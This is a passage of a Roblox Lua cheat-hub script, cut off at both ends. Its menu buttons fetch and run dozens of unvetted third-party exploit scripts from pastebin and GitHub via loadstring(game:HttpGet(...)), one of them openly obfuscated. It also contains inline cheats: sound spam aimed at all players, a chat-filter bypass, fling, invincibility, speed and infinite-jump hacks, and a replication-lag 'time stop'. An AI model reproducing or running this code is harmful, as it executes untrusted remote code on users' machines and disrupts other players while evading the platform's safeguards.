local A_1 = game:GetService("Workspace")["Prison_guardspawn"].spawn.Sound
local A_2 = v.Character.Head
local Event = game:GetService("ReplicatedStorage").SoundEvent
Event:FireServer(A_1, A_2)
end)
end
end
end)

Tab1Section:NewButton("Nexus hub", "A script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnStefano/NexusHub/main/Main", true))()
end)

Tab1Section:NewButton("Annoying sounds for all games", "sounds", function()
--sound thingy

--[[
Made By Scripty#2063
If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
This Gui is Undetectable
RespectFilteringEnabled must be false to use it
--]]

local ScreenGui = Instance.new("ScreenGui")
local Draggable = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Time = Instance.new("TextLabel")
local _1E = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local _3E = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local SE = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Path = Instance.new("TextLabel")
local Top = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Minizum = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local IY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local Wait = Instance.new("TextBox")

--Properties:

ScreenGui.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Draggable.Name = "Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ."
Draggable.Parent = ScreenGui
Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Draggable.BackgroundTransparency = 1.000
Draggable.BorderSizePixel = 0
Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
Draggable.Size = UDim2.new(0, 438, 0, 277)

Frame.Name = ". . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame.Parent = Draggable
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)

Frame_2.Name = " . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
Frame_2.Size = UDim2.new(0, 438, 0, 238)
Frame_2.Active = true
Frame_2.Draggable = true

Time.Name = "Time"
Time.Parent = Frame_2
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1.000
Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
Time.Size = UDim2.new(0, 437, 0, 31)
Time.Font = Enum.Font.GothamSemibold
Time.Text = "RespectFilteringEnabled(RFE) : nil"
Time.TextColor3 = Color3.fromRGB(255, 255, 255)
Time.TextScaled = true
Time.TextSize = 14.000
Time.TextWrapped = true

_1E.Name = "1E"
_1E.Parent = Frame_2
_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_1E.BorderSizePixel = 0
_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
_1E.Size = UDim2.new(0, 208, 0, 33)
_1E.Font = Enum.Font.SourceSans
_1E.Text = "Mute Game"
_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
_1E.TextScaled = true
_1E.TextSize = 30.000
_1E.TextWrapped = true

UICorner.Parent = _1E

_3E.Name = "3E"
_3E.Parent = Frame_2
_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_3E.BorderSizePixel = 0
_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
_3E.Size = UDim2.new(0, 209, 0, 33)
_3E.Font = Enum.Font.SourceSans
_3E.Text = "Annoying  Sound"
_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
_3E.TextSize = 30.000
_3E.TextWrapped = true

UICorner_2.Parent = _3E

SE.Name = "SE"
SE.Parent = Frame_2
SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SE.BorderSizePixel = 0
SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
SE.Size = UDim2.new(0, 209, 0, 33)
SE.Font = Enum.Font.SourceSans
SE.Text = "Kill Sound Service"
SE.TextColor3 = Color3.fromRGB(255, 255, 255)
SE.TextSize = 30.000
SE.TextWrapped = true

UICorner_3.Parent = SE

Path.Name = "Path"
Path.Parent = Frame_2
Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Path.BackgroundTransparency = 1.000
Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
Path.Size = UDim2.new(0, 435, 0, 44)
Path.Font = Enum.Font.GothamSemibold
Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
Path.TextColor3 = Color3.fromRGB(255, 0, 0)
Path.TextScaled = true
Path.TextSize = 14.000
Path.TextWrapped = true

Top.Name = "Top"
Top.Parent = Frame_2
Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top.BorderSizePixel = 0
Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
Top.Size = UDim2.new(0, 438, 0, 30)
Top_2.Name = "Top"
Top_2.Parent = Top
Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top_2.BorderSizePixel = 0
Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
Top_2.Size = UDim2.new(0, 438, 0, 5)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 397, 0, 30)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "FEAG"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
Exit.Size = UDim2.new(0, 32, 0, 25)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "x"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Minizum.Name = "Minizum"
Minizum.Parent = Top
Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minizum.BackgroundTransparency = 1.000
Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
Minizum.Size = UDim2.new(0, 32, 0, 23)
Minizum.Font = Enum.Font.GothamSemibold
Minizum.Text = "_"
Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minizum.TextScaled = true
Minizum.TextSize = 14.000
Minizum.TextWrapped = true

Stop.Name = "Stop"
Stop.Parent = Frame_2
Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
Stop.Size = UDim2.new(0, 424, 0, 33)
Stop.Font = Enum.Font.SourceSans
Stop.Text = "Stop"
Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
Stop.TextSize = 30.000
Stop.TextWrapped = true

UICorner_4.Parent = Stop

IY.Name = "IY"
IY.Parent = Frame_2
IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
IY.Size = UDim2.new(0, 209, 0, 33)
IY.Font = Enum.Font.SourceSans
IY.Text = "Unmute Game"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 30.000
IY.TextWrapped = true

UICorner_5.Parent = IY

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Wait Speed       :"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Wait.Name = "Wait()"
Wait.Parent = Frame_2
Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Wait.BackgroundTransparency = 1.000
Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
Wait.Size = UDim2.new(0, 199, 0, 50)
Wait.ZIndex = 99999
Wait.ClearTextOnFocus = false
Wait.Font = Enum.Font.GothamSemibold
Wait.Text = "0.5"
Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
Wait.TextSize = 30.000
Wait.TextWrapped = true

--Sound Service:
local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 5
notification.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"

--funuction:
Exit.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)
local Mute = false
IY.MouseButton1Click:Connect(function()
	Mute = false
end)

_1E.MouseButton1Click:Connect(function()
	Mute = true
	while Mute == true do 
		wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

_3E.MouseButton1Click:Connect(function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
end)

local Active = true
SE.MouseButton1Click:Connect(function()
	Active = true
	while Active == true do
		local StringValue = Wait.Text
		wait(StringValue)
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		end
	end
end)

Stop.MouseButton1Click:Connect(function()
	Active = false
end)
--Credit:
notification:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "FEAG";
	Text = "FEAG Has Been Loaded , Made By Scripty#2063 (gamer14_123)";
	Icon = "";
	Duration = 10; 
	Button1 = "Yes Sir";
})
--Check:
while true do
	wait(0.5)
	local setting = game:GetService("SoundService").RespectFilteringEnabled
	if setting == true then
		Time.TextColor = BrickColor.new(255,0,0)
		Time.Text ="RespectFilteringEnabled(RFE) : true"
	elseif setting == false then
		Time.Text ="RespectFilteringEnabled(RFE) : false"
		Time.TextColor = BrickColor.new(0,255,0)
	end
end
end)

Tab1Section:NewButton("Nameless admin", "Good admin", function()
-- Thanks to 0866 for making the whole ui work, this admin script was actually made in 2019 lol but was modified by qipu
-- For the commands thanks to IY, Fates Admin, HomeBrew, CMD-X for some of the code and command ideas!
-- For the people thanks to Digitality, i_db, rouxhaver, spec and the v3rmillion community, if you see your script in the source and want credits please dm qipu#9312
-- ! Make sure to have an executor that supports firetouchinterest for the tool commands !
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
end)


--Tab2
Tab2Section:NewButton("Dio's time stop script T to stop time", "If you die the script will break", function()
-- [DIO's Time Stop Script] --

-- Based on the main ability of DIO's Stand, The World, from Part 3 of JoJo's Bizarre Adventure.

-- MOST of everything in this script is written by Tsuagon, except for the screenshake part, that was taken from a tutorial. Credit to the people to made said tutorials and scripts.

----------------------------------------------------------------------------------------------------

-- Player Stuff --

local player = game:GetService("Players").LocalPlayer
local char = player.Character
local head = char.Head
local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
local root = char.HumanoidRootPart
local humanoid = char.Humanoid

local playerhealth = humanoid.Health

local mouse = player:GetMouse()

----------------------------------------------------------------------------------------------------

-- General Stuff --

local tween = game:GetService("TweenService")
local lighting = game:GetService("Lighting")
local input = game:GetService("UserInputService")

local frozenobjectstable = {}

seconds = 10 -- You can change the length in which time is stopped for by modifying this number.

stoppedtime = false

-- Time Stop Effect

local timestopeffect = Instance.new("ColorCorrectionEffect")
timestopeffect.Parent = lighting
timestopeffect.Saturation = 0
timestopeffect.Contrast = 0
timestopeffect.Enabled = true

-- Sphere Effect

local timestopsphere1 = Instance.new("Part")
timestopsphere1.Parent = torso
timestopsphere1.Material = Enum.Material.ForceField
timestopsphere1.Size = Vector3.new(0, 0, 0)
timestopsphere1.Shape = Enum.PartType.Ball
timestopsphere1.CanCollide = false
timestopsphere1.Massless = true
timestopsphere1.Color = Color3.new(1, 1, 1)
timestopsphere1.CastShadow = false

local sphere1weld = Instance.new("Weld")
sphere1weld.Part0 = timestopsphere1
sphere1weld.Part1 = torso
sphere1weld.C0 = torso.CFrame
sphere1weld.C1 = torso.CFrame
sphere1weld.Parent = timestopsphere1

local timestopsphere2 = Instance.new("Part")
timestopsphere2.Parent = torso
timestopsphere2.Material = Enum.Material.ForceField
timestopsphere2.Size = Vector3.new(0, 0, 0)
timestopsphere2.Shape = Enum.PartType.Ball
timestopsphere2.CanCollide = false
timestopsphere2.Massless = true
timestopsphere2.Color = Color3.new(1, 1, 1)
timestopsphere2.CastShadow = false

local sphere2weld = Instance.new("Weld")
sphere2weld.Part0 = timestopsphere2
sphere2weld.Part1 = torso
sphere2weld.C0 = torso.CFrame
sphere2weld.C1 = torso.CFrame
sphere2weld.Parent = timestopsphere2

local timestopsphere3 = Instance.new("Part")
timestopsphere3.Parent = torso
timestopsphere3.Material = Enum.Material.ForceField
timestopsphere3.Size = Vector3.new(0, 0, 0)
timestopsphere3.Shape = Enum.PartType.Ball
timestopsphere3.CanCollide = false
timestopsphere3.Massless = true
timestopsphere3.Color = Color3.new(1, 1, 1)
timestopsphere3.CastShadow = false

local sphere3weld = Instance.new("Weld")
sphere3weld.Part0 = timestopsphere3
sphere3weld.Part1 = torso
sphere3weld.C0 = torso.CFrame
sphere3weld.C1 = torso.CFrame
sphere3weld.Parent = timestopsphere3

-- Sounds

local timestopvoiceline = Instance.new("Sound", head)
timestopvoiceline.SoundId = "rbxassetid://7514417921"
timestopvoiceline.Volume = 5

local injuredtimestopvoiceline = Instance.new("Sound", head)
injuredtimestopvoiceline.SoundId = "rbxassetid://6043864223"
injuredtimestopvoiceline.Volume = 5

local tssfx = Instance.new("Sound", head) 
tssfx.SoundId = "rbxassetid://5679636294"
tssfx.Volume = 5

local timeresumevoiceline = Instance.new("Sound", head)
timeresumevoiceline.SoundId = "rbxassetid://4329802996"
timeresumevoiceline.Volume = 5

local injuredtimeresumevoiceline = Instance.new("Sound", head)
injuredtimeresumevoiceline.SoundId = "rbxassetid://6043853981"
injuredtimeresumevoiceline.Volume = 5

local countervoiceline = Instance.new("Sound", head)
countervoiceline.SoundId = "rbxassetid://6675048510"
countervoiceline.Volume = 5

local countersfx = Instance.new("Sound", head)
countersfx.SoundId = "rbxassetid://4572672240"
countersfx.Volume = 4.5

local tsteleportsfx = Instance.new("Sound", torso)
tsteleportsfx.SoundId = "rbxassetid://3077287610"
tsteleportsfx.Volume = 4.5

local clock = Instance.new("Sound", workspace)
clock.SoundId = "rbxassetid://4940109913"
clock.Volume = 4.5
clock.Looped = true

----------------------------------------------------------------------------------------------------

-- Main Script --

function timestop()
	if stoppedtime == true then return end
	if humanoid.Health < 70 then
		injuredtimestopvoiceline:Play()
		wait(1)
		tssfx:Play()
	elseif humanoid.Health > 50 then
		timestopvoiceline:Play()
		wait(1.6)
	end
        settings().Network.IncomingReplicationLag = math.huge
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then
			if not v.Anchored == true then
				if not v:IsDescendantOf(char) then
					v.Anchored = true
					table.insert(frozenobjectstable, v)
				end
			end
		end
	end
	coroutine.resume(coroutine.create(function()
		coroutine.resume(coroutine.create(function()
			timestopeffect.Enabled = true
			tween:Create(workspace.CurrentCamera, TweenInfo.new(1.5, Enum.EasingStyle.Exponential), {FieldOfView = 250}):Play();
			coroutine.resume(coroutine.create(function()
				while stoppedtime == false do
					tween:Create(timestopeffect, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {Contrast = -2}):Play();
					wait(0.3)
					tween:Create(timestopeffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Saturation = -1}):Play();
					wait(0.2)
					tween:Create(timestopeffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Saturation = -2}):Play();
					wait()
					tween:Create(timestopeffect, TweenInfo.new(0.8, Enum.EasingStyle.Quart), {Contrast = -2.4}):Play();
					wait(0.3)
					tween:Create(timestopeffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Saturation = 1}):Play();
					wait(0.2)
					tween:Create(timestopeffect, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Saturation = -2}):Play();
				end
			end))
			wait(1.7)
			tween:Create(workspace.CurrentCamera, TweenInfo.new(1, Enum.EasingStyle.Quart), {FieldOfView = 70}):Play();
			tween:Create(timestopeffect, TweenInfo.new(1, Enum.EasingStyle.Quart), {Contrast = 0}):Play();
			tween:Create(timestopeffect, TweenInfo.new(1, Enum.EasingStyle.Quart), {Saturation = -0.8}):Play();
		end))
		coroutine.resume(coroutine.create(function()
			for _ = 1, 65 do
				wait()
				local offset1 = math.random(-650, 650) / 700
				local offset2 = math.random(-650, 650) / 700
				local offset3 = math.random(-650, 650) / 700
				tween:Create(humanoid, TweenInfo.new(0.1), {CameraOffset = Vector3.new(offset1, offset2, offset3)}):Play();
			end
			tween:Create(humanoid, TweenInfo.new(0.1), {CameraOffset = Vector3.new(0, 0, 0)}):Play();
		end))
		coroutine.resume(coroutine.create(function()
			tween:Create(timestopsphere1, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(45, 45, 45)}):Play();
			tween:Create(timestopsphere2, TweenInfo.new(1.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(40, 40, 40)}):Play();
			tween:Create(timestopsphere3, TweenInfo.new(1.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(35, 35, 35)}):Play();
			wait(1.7)
			tween:Create(timestopsphere1, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(0, 0, 0)}):Play();
			tween:Create(timestopsphere2, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(0, 0, 0)}):Play();
			tween:Create(timestopsphere3, TweenInfo.new(1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out, 0), {Size = Vector3.new(0, 0, 0)}):Play();
		end))
		coroutine.resume(coroutine.create(function()
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("ParticleEmitter") then
					tween:Create(v, TweenInfo.new(3), {TimeScale = 0}):Play();
				end
			end
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("Fire") then
					tween:Create(v, TweenInfo.new(3), {TimeScale = 0}):Play();
				end
			end
		end))
		coroutine.resume(coroutine.create(function()
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("Sound") then
					if not v:IsDescendantOf(char) then
						tween:Create(v, TweenInfo.new(4), {PlaybackSpeed = 0}):Play();
					end
				end
			end
		end))
	end))
	stoppedtime = true
	wait(seconds)
	timeresume()
end

function timeresume()
	if stoppedtime == false then return end
	if humanoid.Health < 70 then
		injuredtimeresumevoiceline:Play()
		wait(0.6)
	elseif humanoid.Health > 50 then
		timeresumevoiceline:Play()
		wait(0.9)
	end
        settings().Network.IncomingReplicationLag = 0
	for _, v in pairs(frozenobjectstable) do
		if v:IsA("BasePart") then
			v.Anchored = false
		end
	end
	coroutine.resume(coroutine.create(function()
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("ParticleEmitter") then
				tween:Create(v, TweenInfo.new(3), {TimeScale = 1}):Play();
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("Fire") then
				tween:Create(v, TweenInfo.new(3), {TimeScale = 1}):Play();
			end
		end
	end))
	coroutine.resume(coroutine.create(function()
		for _, v in pairs(workspace:GetDescendants()) do
			if v:IsA("Sound") then
				if not v:IsDescendantOf(char) then
					tween:Create(v, TweenInfo.new(2), {PlaybackSpeed = 1}):Play();
				end
			end
		end
	end))
	tween:Create(timestopeffect, TweenInfo.new(2, Enum.EasingStyle.Quart), {Saturation = 0}):Play();
	stoppedtime = false
end

function tsteleport()
	if stoppedtime == true then return end
	tsteleportsfx:Play()
	coroutine.resume(coroutine.create(function()
		tween:Create(timestopeffect, TweenInfo.new(0.1), {TintColor = Color3.new(0, 0, 0)}):Play();
		wait(0.2)
		tween:Create(timestopeffect, TweenInfo.new(0.1), {TintColor = Color3.new(1, 1, 1)}):Play();
	end))
	root.CFrame = CFrame.new(mouse.Hit.p.X, mouse.Hit.p.Y, mouse.Hit.p.Z)
end

--[[function counter()
	countervoiceline:Play()
	wait(0.6)
	humanoid.HealthChanged:Connect(function(health)
		if playerhealth > 100 then
			countersfx:Play()
			root.CFrame = root.CFrame + root.CFrame.lookVector * -20
		elseif health == playerhealth then return end
	end)
end]]--

mouse.KeyDown:Connect(function(key)
	if key == "t" and stoppedtime == false then
		timestop()
	elseif key == "t" and stoppedtime == true then
		timeresume()
	end
	if key == "v" and stoppedtime == false then
		tsteleport()
	end
end)
end)


-- Tab2
Tab2Section:NewButton("Beat people Up Script", "Fun", function()
loadstring(game:HttpGet("https://pastebin.com/raw/51zKSGrz"))()
end)

Tab2Section:NewButton("Message On damage", "If you get hurt a message will play", function()
getgenv().hurtmessages = {
   "That hurt!",
   "Watch where you're swinging!",
   "Ow! That's gonna leave a mark!",
   "Stop attacking me!",
   "I'm not feeling so good...",
   "Is that all you've got?",
   "Can't catch a break!",
   "That was a cheap shot!",
   "You'll regret that!",
   "Ouch!"
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/dta-bse/v3rm/main/Message%20on%20damage"))()
end)

Tab2Section:NewButton("FE God Touch Fling", "No Hats", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/YKKG5SQT"))();
end)

Tab2Section:NewButton("FE The Rake", "No Hats And Needs Keyboard", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet(('https://pastebin.com/raw/myLKkZiB'),true))()
end)

Tab2Section:NewButton("Fe Yeet GUI", "Yayt!", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
end)

Tab2Section:NewButton("FE Chat Bypass v1", "Interdemensionality", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/chatbypasser/main/chatbypasserv1'),true))()
end)

Tab2Section:NewButton("Mocha Hub", "Fresh Blood And Tears", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/m0bwSpXD"))();
end)

Tab2Section:NewButton("Pendelum Hub", ":D", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
end)

Tab2Section:NewButton("FE Invinsibility", "Makes You Invinsible! Gui.", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/2ucYrZ9H"))();
end)

Tab2Section:NewButton("Administrated Hub", "AkilBlox14 Hub Is Discontinued. Or Is It?", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/18dKJNRE"))();
end)


-- Tab3
Tab3Section:NewButton("Infinite Jumps", "Enables Inf Jumps", function()
    local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)

Tab3Section:NewToggle("Fov", "Makes your screen wider.", function(state)
    if state then
        game.Workspace.CurrentCamera.FieldOfView = 120
    else
        game.Workspace.CurrentCamera.FieldOfView = 80
    end
end)

Tab3Section:NewSlider("Speed", "Sonic The Hedgehog", 250, 120, function(v)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

Tab3Section:NewButton("Smooth RTX", "GameBooster Actually.", function()
loadstring(game:HttpGet("https://pastebin.com/raw/NQbKPheB"))();
loadstring(game:HttpGet("https://pastebin.com/raw/Qtapr1f2"))();
end)
      		print("button pressed")
  	end    
})

Tab22:AddButton({
	Name = "Gear script chooser",
	Callback = function()
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "GearChoose Script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]


local Tab = Window:MakeTab({
	Name = "Script",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

Tab:AddButton({
	Name = "Gblade V5",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/GBlade-V5/main/GBlade%20V5"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "StareX",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/StareX-V1-Open-Source/main/StareX%20Open%20Source"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Cracked Hub V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Cracked-Hub-V2/main/Cracked%20Hub"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Auto Play Piano",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Auto-Play-Piano-V8/main/Auto%20Play%20Piano%20V8"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "SkyHub",
	Callback = function()
	  loadstring(game:HttpGet("https://pastebin.com/raw/4uETPKhN"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "R3TH V4",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "XLsploit",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/XLSPloit-V2.lua/main/Obfuscate"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Gear SSX x Simple Hub",
	Callback = function()
